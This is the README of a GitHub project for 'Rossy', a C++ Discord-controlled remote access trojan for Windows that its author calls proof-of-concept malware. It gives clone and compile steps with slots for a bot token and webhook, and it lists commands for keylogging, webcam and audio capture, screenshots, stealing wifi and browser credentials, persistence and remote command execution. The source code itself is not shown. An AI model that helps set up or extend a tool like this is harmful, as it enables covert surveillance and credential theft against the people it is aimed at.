# MK04-Rossy

## [!!] DISCLAIMER
Rossy is proof of concept malware that should not be run on systems you do not have permission to run malicious code on.

## Overview:
Rossy ("raw-C"...get it?) is a very very proof of concept Discord RAT. It is the second iteration of the hive mind malware, coming right after the [mk02](https://github.com/CosmodiumCS/MK02-Rexord). It was my first project using C++, so don't judge the code too much ;)

## Resources:
- [YouTube Video](https://cosmodiumcs.com/coming-soon)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Windows 10 Target
- D++ Library

## Installation:
1. clone the repository
```bash
git clone https://github.com/CosmodiumCS/MK04-Rossy
cd MK04-Rossy/MyBot
```
2. on line 25 of `MyBot.cpp`, add your token and webhook
```cpp
const std::string BOT_TOKEN = "YOUR_TOKEN_HERE";
const string WEBHOOK = "YOUR_WEBHOOK_HERE";
```
3. compile the main code
```bash
g++ -std=c++17 MyBot.cpp -o mybot -ldpp
```

## Features:
**[+] Getting Started:**
 - `/help` - displays this menu
 - `/hello` - see connected targets
 - `/select <target>` - connect to specified target ['all' by default]

**[+] General:**
 - `/upload <attachment>` - upload file(s) to target
 - `/download` - download file(s) [list multiple with ","] 
 - `/shutdown` - shuts down target
 - `/restart` - restarts target
 - `/exit` - exits target [can't reconnect]
 - `/killswitch` - uninstalls from target
 
**[+] Modules:**
 - `/install` - install modules to target
 - `/keylogger` - starts live keylogger
 - `/webcam` - take picture through target webcam
 - `/screenshot` - screenshot target computer
 - `/record player <seconds>` - record audio from target 
 - `/wifi creds` - gets wifi credentials
 - `/web creds` - gets web credentials

**[+] System:**
 - `/persist` - executes persistence on target
 - `/$<command>` - execute system command on target
 - `/private` - get private ip address
 - `/public` - get public ip address
 - `/os` - show os info)"""

## Extraneous:
Again, this was designed as a proof of concept, and not a legitimate malware